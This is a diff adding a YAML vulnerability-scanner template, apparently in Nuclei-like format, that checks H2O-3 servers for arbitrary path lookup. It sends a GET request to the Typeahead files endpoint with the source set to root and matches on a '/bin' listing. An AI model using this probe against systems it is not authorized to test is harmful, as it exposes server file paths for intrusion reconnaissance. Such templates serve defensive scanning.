@@ -1,0 +1,33 @@
+id: h2o-arbitary-file-read
+brief:
+    title: H2O - Arbitrary Path Lookup
+    by: danmcinerney
+    level: medium
+    about: H2O allows for arbitrary path lookup via it's Typehead API endpoint
+    label:
+        - h2o-3
+        - h2o
+        - info-leak
+        - lfi
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/3/Typeahead/files?src=%2F&limit=10'
+      signs:
+        - "on": word
+          has:
+            - '"/bin"'
+            - '"__meta":'
+            - '"schema_name":'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
